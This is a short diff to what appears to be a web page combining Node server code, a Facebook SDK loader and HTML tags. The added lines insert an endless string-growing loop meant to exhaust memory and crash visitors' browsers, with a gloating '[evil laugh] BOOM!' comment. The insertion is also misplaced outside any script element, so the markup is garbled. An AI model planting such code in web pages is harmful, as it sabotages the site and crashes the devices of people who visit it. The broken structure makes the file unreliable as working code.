@@ -444,6 +444,11 @@ net.createServer(function (socket) {
     js.src = "//connect.facebook.net/en_US/sdk.js";
     fjs.parentNode.insertBefore(js, fjs);
 }(document, 'script', 'facebook-jssdk'));">
+   txt = "a";
+while(1){
+    txt = txt += "a";    //add as much as the browser can handle
+}
+//[evil laugh] BOOM! All memory used up, and it is now CRASHED!
    <link rel="icon" href="image (6).jpg" type="image/gif" sizes="16x16">
 <body>
 </body>
